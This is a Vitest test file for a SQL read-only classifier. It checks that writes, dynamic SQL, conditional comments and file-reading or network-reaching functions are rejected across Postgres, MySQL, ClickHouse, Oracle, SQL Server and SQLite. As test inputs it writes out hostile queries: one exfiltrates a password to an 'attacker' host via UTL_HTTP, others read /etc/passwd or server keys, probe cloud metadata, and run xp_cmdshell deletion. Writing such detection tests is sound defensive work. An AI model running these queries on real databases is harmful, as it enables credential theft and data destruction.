import { describe, it, expect } from "vitest";
import type { ConnectorType } from "../../connectors/interface.js";
import { isReadOnlySQL } from "../allowed-keywords.js";

// Multi-statement behaviour (split, then classify each statement) lives in
// src/utils/sql-access-policy.ts and is tested in sql-access-policy.test.ts.
// Everything here is single-statement classification.

/** [what the case shows, dialect, sql] */
type Case = [label: string, dialect: ConnectorType, sql: string];

const allows = (_label: string, dialect: ConnectorType, sql: string) => {
  expect(isReadOnlySQL(sql, dialect)).toBe(true);
};
const rejects = (_label: string, dialect: ConnectorType, sql: string) => {
  expect(isReadOnlySQL(sql, dialect)).toBe(false);
};

describe("isReadOnlySQL", () => {
  describe("basic read-only detection", () => {
    it.each<Case>([
      ["SELECT", "postgres", "SELECT * FROM users"],
      ["a lower-case select (keywords are case-insensitive)", "postgres", "select * from users"],
      ["WITH", "postgres", "WITH cte AS (SELECT 1) SELECT * FROM cte"],
      ["EXPLAIN", "postgres", "EXPLAIN SELECT * FROM users"],
      ["a SELECT after a multi-line comment naming a write", "postgres", "/* INSERT */ SELECT * FROM users"],
      ["a SELECT after a commented-out destructive statement", "postgres", "-- DELETE FROM users\nSELECT * FROM users"],
    ])("allows %s (%s)", allows);

    it.each<Case>([
      ["INSERT", "postgres", "INSERT INTO users VALUES (1)"],
      ["UPDATE", "postgres", "UPDATE users SET name = 'test'"],
      ["DELETE", "postgres", "DELETE FROM users"],
      ["a write after a comment naming SELECT", "postgres", "/* SELECT */ INSERT INTO users VALUES (1)"],
      // Attacker-crafted input may reduce to nothing once comments are stripped.
      ["SQL that is empty after comment stripping", "postgres", "-- just a comment"],
    ])("rejects %s (%s)", rejects);
  });

  describe("database-specific keywords", () => {
    it.each<Case>([
      ["SHOW", "mysql", "SHOW TABLES"],
      ["DESCRIBE", "mysql", "DESCRIBE users"],
      ["SHOW CREATE TABLE", "mysql", "SHOW CREATE TABLE users"],
      ["SHOW CREATE PROCEDURE", "mariadb", "SHOW CREATE PROCEDURE my_proc"],
      ["EXPLAIN (translated to SHOWPLAN_XML by the connector)", "sqlserver", "EXPLAIN SELECT * FROM users"],
    ])("allows %s (%s)", allows);

    it.each<Case>([
      ["SHOW", "sqlite", "SHOW TABLES"],
      ["standalone ANALYZE (updates statistics)", "postgres", "ANALYZE users"],
      ["standalone ANALYZE (updates statistics)", "mysql", "ANALYZE"],
      ["SHOWPLAN (not a real T-SQL statement)", "sqlserver", "SHOWPLAN SELECT * FROM users"],
      ["bare SET SHOWPLAN_XML (session-scoped, handled via EXPLAIN)", "sqlserver", "SET SHOWPLAN_XML ON"],
    ])("rejects %s (%s)", rejects);
  });

  describe("CTE with mutating operations", () => {
    it.each([
      ["UPDATE", "WITH updated AS (UPDATE contracts SET site_location_postcode = 'SW11' WHERE id = 1 RETURNING id) SELECT * FROM updated"],
      ["DELETE", "WITH deleted AS (DELETE FROM users WHERE id = 1 RETURNING *) SELECT * FROM deleted"],
      ["INSERT", "WITH inserted AS (INSERT INTO users (name) VALUES ('test') RETURNING *) SELECT * FROM inserted"],
      ["DROP (CTE-like construct)", "WITH x AS (SELECT 1) DROP TABLE users"],
    ])("should reject %s inside a CTE", (_keyword, sql) => {
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });

    it.each(["mysql", "sqlite"] as const)(
      "should reject REPLACE INTO (non-function) inside WITH in %s",
      (dialect) => {
        const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
        expect(isReadOnlySQL(sql, dialect)).toBe(false);
      }
    );

    it.each<Case>([
      ["mutating keywords in string literals", "postgres", "WITH cte AS (SELECT 'UPDATE me' AS note) SELECT * FROM cte"],
      ["a CTE named 'replace'", "mysql", "WITH replace AS (SELECT 1) SELECT * FROM replace"],
      // MySQL's mutating pattern knows REPLACE INTO; a REPLACE() call must not match it.
      ["REPLACE() inside a WITH CTE", "mysql", "WITH cte AS (SELECT REPLACE(name, 'a', 'b') AS cleaned FROM users) SELECT * FROM cte"],
    ])("allows %s (%s)", allows);
  });

  describe("EXPLAIN", () => {
    it.each([
      // EXPLAIN doesn't execute the statement, just shows the plan
      "EXPLAIN DELETE FROM users",
      // EXPLAIN ANALYZE executes it, which is fine for a read
      "EXPLAIN ANALYZE SELECT * FROM users",
      "EXPLAIN ANALYZE VERBOSE SELECT * FROM users",
      // PostgreSQL accepts ANALYSE wherever it accepts ANALYZE (#501).
      "EXPLAIN ANALYSE SELECT * FROM users",
      // ANALYZE switched off: not executed
      "EXPLAIN (ANALYZE false) DELETE FROM users",
      "EXPLAIN (ANALYZE off) DELETE FROM users",
      "EXPLAIN (ANALYSE false) DELETE FROM users",
      // An unrecognized option might execute the statement, which is fine for a read
      "EXPLAIN (RUN_IT) SELECT * FROM users",
      // Options that only shape the plan output
      "EXPLAIN (VERBOSE, COSTS off, FORMAT JSON) DELETE FROM users",
      "EXPLAIN (BUFFERS, SETTINGS, GENERIC_PLAN) DELETE FROM users",
      // A leading parenthesis that opens a query is not an option list.
      "EXPLAIN (SELECT id FROM users) UNION (SELECT id FROM admins)",
      'EXPLAIN (SELECT id, "analyze" FROM users) UNION (SELECT 1, 2)',
      "EXPLAIN ((SELECT 1)) UNION (SELECT 2)",
      "EXPLAIN (VALUES (1)) UNION (VALUES (2))",
      "EXPLAIN (WITH x AS (SELECT 1) SELECT * FROM x)",
    ])("allows %s", (sql) => {
      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
    });

    it.each([
      // EXPLAIN ANALYZE with DML: Postgres executes the statement
      "EXPLAIN ANALYZE DELETE FROM users",
      "EXPLAIN (ANALYZE) DELETE FROM users",
      "EXPLAIN ANALYZE SELECT * INTO new_table FROM users",
      "EXPLAIN ANALYZE VERBOSE DELETE FROM users",
      // PostgreSQL accepts ANALYSE wherever it accepts ANALYZE (#501).
      "EXPLAIN ANALYSE DELETE FROM users",
      "EXPLAIN ANALYSE VERBOSE DELETE FROM users",
      "EXPLAIN (ANALYSE) DELETE FROM users",
      "EXPLAIN (VERBOSE, ANALYSE true) DELETE FROM users",
      // A quoted option name is still the option to PostgreSQL, but it is
      // stripped before classification, so the list cannot be shown to be safe.
      'EXPLAIN ("analyze") DELETE FROM users',
      'EXPLAIN ("analyze" true) DELETE FROM users',
      'EXPLAIN (VERBOSE, "analyze") DELETE FROM users',
      'EXPLAIN (U&"\\0061nalyze") DELETE FROM users',
      // An unrecognized option might be one that executes the statement
      "EXPLAIN (RUN_IT) DELETE FROM users",
      // PostgreSQL applies options in order, so a later ANALYZE wins.
      "EXPLAIN (ANALYZE false, ANALYZE) DELETE FROM users",
    ])("rejects %s", (sql) => {
      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
    });
  });

  describe("SELECT INTO", () => {
    it.each<Case>([
      ["SELECT INTO (Postgres table creation)", "postgres", "SELECT * INTO new_table FROM users"],
      ["SELECT INTO OUTFILE (MySQL)", "mysql", "SELECT * INTO OUTFILE '/tmp/data.csv' FROM users"],
      ["SELECT INTO with WHERE clause", "sqlserver", "SELECT id, name INTO backup_table FROM users WHERE active = true"],
      ["WITH ... SELECT INTO", "postgres", "WITH cte AS (SELECT * FROM users) SELECT * INTO new_table FROM cte"],
    ])("rejects %s (%s)", rejects);
  });

  describe("ClickHouse keywords", () => {
    it.each<Case>([
      ["SELECT", "clickhouse", "SELECT count() FROM events FINAL"],
      ["WITH", "clickhouse", "WITH 1 AS x SELECT x"],
      ["SHOW", "clickhouse", "SHOW CREATE TABLE events"],
      ["DESCRIBE", "clickhouse", "DESCRIBE TABLE events"],
      ["DESC", "clickhouse", "DESC events"],
      ["EXISTS", "clickhouse", "EXISTS TABLE analytics.events"],
      ["EXPLAIN with settings", "clickhouse", "EXPLAIN indexes = 1 SELECT * FROM events WHERE id = 1"],
      ["EXPLAIN ESTIMATE", "clickhouse", "EXPLAIN ESTIMATE SELECT * FROM events"],
      ["a trailing SETTINGS clause", "clickhouse", "SELECT * FROM events SETTINGS max_threads = 1"],
      ["cluster table functions, which read the same tables on other replicas", "clickhouse", "SELECT * FROM clusterAllReplicas('default', system.query_log)"],
      ["a column or alias named after a table function", "clickhouse", "SELECT url, file, domain(url) AS remote FROM hits"],
      ["a combinator that ends in Merge inside a WITH", "clickhouse", "WITH t AS (SELECT uniqMerge(u) AS u FROM agg) SELECT u FROM t"],
    ])("allows %s", allows);

    it.each<Case>([
      ["INSERT", "clickhouse", "INSERT INTO events VALUES (1)"],
      ["ALTER ... DELETE (a mutation)", "clickhouse", "ALTER TABLE events DELETE WHERE id = 1"],
      ["OPTIMIZE", "clickhouse", "OPTIMIZE TABLE events FINAL"],
      ["SYSTEM", "clickhouse", "SYSTEM FLUSH LOGS"],
      ["SET", "clickhouse", "SET max_threads = 1"],
      ["USE", "clickhouse", "USE analytics"],
      ["KILL", "clickhouse", "KILL QUERY WHERE query_id = 'x'"],
      ["TRUNCATE", "clickhouse", "TRUNCATE TABLE events"],
      ["DETACH", "clickhouse", "DETACH TABLE events"],
      ["SELECT ... INTO OUTFILE", "clickhouse", "SELECT * FROM events INTO OUTFILE 'out.csv'"],
      ["a write hidden behind a // comment line", "clickhouse", "// note\nDROP TABLE events"],
    ])("rejects %s", rejects);

    it.each<Case>([
      ["url()", "clickhouse", "SELECT * FROM url('http://169.254.169.254/latest/meta-data', 'RawBLOB')"],
      ["s3()", "clickhouse", "SELECT * FROM s3('https://bucket.s3.amazonaws.com/x.csv')"],
      ["file()", "clickhouse", "SELECT * FROM file('/etc/passwd', 'LineAsString')"],
      ["remote()", "clickhouse", "SELECT * FROM remote('other:9000', db.t)"],
      ["remoteSecure()", "clickhouse", "SELECT * FROM remoteSecure('other:9440', db.t)"],
      ["mysql()", "clickhouse", "SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')"],
      ["postgresql() in a subquery", "clickhouse", "SELECT count() FROM (SELECT * FROM postgresql('h:5432', 'db', 't', 'u', 'p'))"],
      ["executable()", "clickhouse", "SELECT * FROM executable('script.sh', 'TSV', 'x String')"],
      ["a table function with a space before the parenthesis, in any case", "clickhouse", "SELECT * FROM URL ('http://x', CSV)"],
    ])("rejects %s, which reaches outside the server", rejects);
  });

  describe("Oracle keywords", () => {
    it("allows SELECT, WITH and EXPLAIN [PLAN FOR]", () => {
      expect(isReadOnlySQL("SELECT * FROM dual", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (SELECT 1 FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("EXPLAIN PLAN FOR SELECT * FROM users", "oracle")).toBe(true);
    });

    it("denies PL/SQL blocks and Oracle-specific writes", () => {
      expect(isReadOnlySQL("BEGIN DELETE FROM users; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("DECLARE n NUMBER; BEGIN NULL; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = 1", "oracle")).toBe(false);
      expect(isReadOnlySQL("CALL my_proc()", "oracle")).toBe(false);
    });

    it("does not let a q-quoted literal hide a write inside a CTE", () => {
      // The literal's body contains a single quote, so an ANSI scanner would
      // end the string early and expose `DELETE` as plain SQL.
      expect(isReadOnlySQL("WITH x AS (SELECT q'[it's]' AS s FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (DELETE FROM t) SELECT q'[x]' FROM dual", "oracle")).toBe(false);
    });
  });

  describe("SQL Server dynamic SQL bypass prevention", () => {
    it.each([
      ["EXEC", "EXEC('DELETE FROM users')"],
      ["EXECUTE", "EXECUTE('DELETE FROM users')"],
      ["EXEC sp_executesql", "EXEC sp_executesql N'DELETE FROM users'"],
    ])("should reject %s as a standalone statement", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it.each([
      ["EXEC", "WITH cte AS (SELECT 1) EXEC('DELETE FROM users')"],
      ["EXECUTE", "WITH cte AS (SELECT 1) EXECUTE('DELETE FROM users')"],
      ["implicit sp_executesql (no EXEC prefix)", "WITH cte AS (SELECT 1) sp_executesql N'DELETE FROM users'"],
      ["xp_cmdshell", "WITH cte AS (SELECT 1) xp_cmdshell 'del *.*'"],
    ])("should reject %s inside a CTE", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it("should not reject EXEC/EXECUTE inside string literals", () => {
      expect(isReadOnlySQL("SELECT * FROM users WHERE name = 'EXEC is a keyword'", "sqlserver")).toBe(true);
    });
  });

  describe("MySQL conditional comment bypass prevention", () => {
    // The scanner's handling of executable comments is pinned in
    // sql-parser.test.ts; these pin the classifier's verdict on them.
    it.each([
      ["mysql", "/*!50000 DELETE FROM users WHERE 1=1 */"],
      ["mariadb", "/*M! DELETE FROM users */"],
    ] as const)("should reject %s executable comment containing DELETE: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("should reject even SELECT inside MySQL conditional comment (safe default)", () => {
      // Conditional comment syntax is preserved as plain text, so the first
      // word includes the /*! prefix — safer to deny than to parse the body.
      expect(isReadOnlySQL("/*!50000 SELECT 1 */", "mysql")).toBe(false);
    });

    it("should still strip regular comments for MySQL", () => {
      expect(isReadOnlySQL("/* comment */ SELECT 1", "mysql")).toBe(true);
    });
  });

  describe("SQLite PRAGMA write bypass prevention", () => {
    it("should allow query-form introspection pragmas", () => {
      expect(isReadOnlySQL("PRAGMA user_version", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA journal_mode", "sqlite")).toBe(true);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version = 1337"],
      ["changing durable state", "PRAGMA journal_mode = WAL"],
      ["disabling the read-only backstop", "PRAGMA query_only = OFF"],
      ["without surrounding spaces", "PRAGMA user_version=1"],
    ])("should reject assignment-form pragma %s", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version(1337)"],
      ["changing durable state", "PRAGMA journal_mode(wal)"],
      ["disabling the read-only backstop", "PRAGMA query_only(0)"],
    ])("should reject the parenthesized setter form (equivalent to '= value') %s", (_label, sql) => {
      // SQLite accepts `PRAGMA name(value)` as an alias for `PRAGMA name = value`.
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it("should still allow introspection pragmas that take a name argument", () => {
      expect(isReadOnlySQL("PRAGMA table_info(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA index_list(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA foreign_key_list(orders)", "sqlite")).toBe(true);
    });
  });

  describe("escape-hatch function bypass prevention (issue #377)", () => {
    // Functions callable from a plain SELECT that read the server filesystem or
    // take server-wide locks — a read-only transaction does not contain them.
    it.each([
      ["mysql", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mysql", "SELECT get_lock('x', 10)"],
      ["mysql", "SELECT RELEASE_LOCK('x')"],
      ["mysql", "SELECT RELEASE_ALL_LOCKS()"],
      ["mariadb", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mariadb", "SELECT get_lock('x', 10)"],
      ["postgres", "SELECT pg_read_file('/etc/passwd')"],
      ["postgres", "SELECT pg_read_binary_file('server.key')"],
      ["postgres", "SELECT pg_ls_dir('/var/lib/postgresql')"],
      // set_config is SET in function form; the session-scoped variant undoes
      // the statement_timeout / search_path applied at connect (issue #448).
      // Reading a setting through current_setting stays allowed; that pair is
      // pinned together in sql-access-policy.test.ts.
      ["postgres", "SELECT set_config('statement_timeout', '0', false)"],
      ["postgres", "SELECT pg_catalog.set_config('search_path', 'pg_catalog,public', false)"],
      // SQL Server pass-through sources share the same call-position guard:
      // OPENQUERY's payload runs on the remote server, OPENROWSET(BULK) reads
      // server-side files, OPENDATASOURCE opens ad-hoc connections.
      ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'DELETE FROM customers')"],
      ["sqlserver", "SELECT * FROM OPENROWSET(BULK N'C:\\secrets\\config.ini', SINGLE_CLOB) AS x"],
      ["sqlserver", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil;Trusted_Connection=yes').db.dbo.t"],
      ["sqlserver", "WITH cte AS (SELECT * FROM OPENQUERY(srv, 'DROP TABLE t')) SELECT * FROM cte"],
      // Oracle packages reachable from a SELECT: network/filesystem access
      // and arbitrary code execution, matched on the package prefix.
      ["oracle", "SELECT UTL_HTTP.REQUEST('http://attacker/' || (SELECT password FROM t)) FROM dual"],
      ["oracle", "SELECT utl_inaddr.get_host_address('x') FROM dual"],
      ["oracle", "SELECT DBMS_XSLPROCESSOR.READ2CLOB('DIR', 'passwd') FROM dual"],
      ["oracle", "SELECT dbms_scheduler . create_job('x') FROM dual"],
    ] as const)("rejects %s escape-hatch call: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("rejects an escape-hatch call buried in a subquery / FROM clause", () => {
      expect(isReadOnlySQL("SELECT * FROM (SELECT LOAD_FILE('/etc/passwd') AS x) t", "mysql")).toBe(false);
      expect(isReadOnlySQL("WITH t AS (SELECT pg_read_file('x')) SELECT * FROM t", "postgres")).toBe(false);
    });

    it.each<Case>([
      ["a column", "mysql", "SELECT load_file FROM documents"],
      ["an alias", "mysql", "SELECT count(*) AS get_lock FROM t"],
      ["a column", "postgres", "SELECT pg_read_file FROM audit"],
      ["a column", "postgres", "SELECT set_config FROM audit"],
      ["a bare column (no call syntax)", "sqlserver", "SELECT openquery FROM logs"],
      ["an identifier that merely starts with the name", "sqlserver", "SELECT openquery_audit FROM logs"],
      ["a column", "oracle", "SELECT utl_http FROM audit_log"],
      ["a table", "oracle", "SELECT * FROM dbms_sql"],
      // A qualified column reference is not a member call.
      ["a qualified column reference", "oracle", "SELECT dbms_sql.foo FROM t dbms_sql"],
      // Each dialect has its own list: pg_read_file is a Postgres function,
      // load_file is MySQL's, and openquery is SQL Server's, so elsewhere even a
      // call of that name is fine.
      ["a column named after another dialect's function", "mysql", "SELECT pg_read_file FROM t"],
      ["a column named after another dialect's function", "postgres", "SELECT load_file FROM t"],
      ["a call of another dialect's function", "postgres", "SELECT * FROM openquery(a, b)"],
    ])("still allows %s named like an escape-hatch function (%s): %s", allows);
  });
});
